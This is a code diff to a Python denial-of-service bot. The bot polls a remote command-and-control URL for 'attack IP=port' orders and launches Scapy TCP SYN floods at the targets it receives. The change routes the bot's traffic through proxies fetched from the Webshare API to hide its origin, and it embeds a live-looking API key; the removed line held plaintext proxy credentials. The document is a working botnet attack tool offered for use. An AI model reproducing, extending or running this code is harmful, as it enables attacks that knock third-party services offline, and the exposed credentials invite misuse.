@@ -2,17 +2,50 @@ import requests
 import re
 from scapy.all import *
 import time
+import json
 
-# Define variables
+# Define the Webshare API URL and API Key
+WEBSHARE_API_URL = "https://proxy.webshare.io/api/v2/proxy/list/"
+API_KEY = "9veq72n75r2m6dm9yw9imrbedai8c4gxymqu559j"  # Your Webshare API Key
+
+# Define the target URL for getting commands
 url = "http://chathere.getenjoyment.net/apk_payload/index2.php"
-proxy = "socks5://rduvmedi:ktnk2cx55f1y@38.154.227.167:5868"  # Your SOCKS5 proxy
 
-# Setup proxies for requests
-proxies = {
-    "http": proxy,
-    "https": proxy
+# Setup headers for Webshare API authentication
+headers = {
+    "Authorization": f"Bearer {API_KEY}"
 }
 
+# Function to get a proxy from Webshare API
+def get_webshare_proxy():
+    try:
+        response = requests.get(WEBSHARE_API_URL, headers=headers)
+        if response.status_code == 200:
+            proxies = response.json().get("results", [])
+            if proxies:
+                # Pick the first proxy from the list (you can customize this)
+                proxy = proxies[0]
+                proxy_str = f"socks5://{proxy['username']}:{proxy['password']}@{proxy['proxy_address']}:{proxy['proxy_port']}"
+                return proxy_str
+            else:
+                print("No proxies available from Webshare.")
+                return None
+        else:
+            print(f"Error fetching proxies from Webshare API: {response.status_code}")
+            return None
+    except requests.exceptions.RequestException as e:
+        print(f"Error with Webshare API request: {e}")
+        return None
+
+# Setup proxies for requests (fetch proxy from Webshare)
+proxy = get_webshare_proxy()  # Get proxy from Webshare API
+if proxy:
+    proxies = {
+        "http": proxy,
+        "https": proxy
+    }
+
+# Extract IP and Port from the command
 def extract_ip_port(command):
     pattern = r"attack (\d+\.\d+\.\d+\.\d+)=(\d+)"
     match = re.match(pattern, command)
@@ -23,6 +56,7 @@ def extract_ip_port(command):
     else:
         return None, None
 
+# TCP SYN flood using Scapy
 def syn_flood(ip, port):
     print(f"Starting TCP SYN flood on {ip}:{port}")
     total_packets = 0
@@ -44,6 +78,7 @@ def syn_flood(ip, port):
         total_packets += 1
         print(f"Sent {total_packets} packets: Success={successful_attempts}, Failures={failed_attempts}")
 
+# Function to listen for commands and start attacks
 def listen_for_commands():
     while True:
         try:
@@ -72,4 +107,7 @@ def listen_for_commands():
         time.sleep(5)
 
 if __name__ == "__main__":
-    listen_for_commands()
+    if proxy:  # Only run the bot if proxy is fetched successfully
+        listen_for_commands()
+    else:
+        print("No proxy available. Cannot start the attack.")
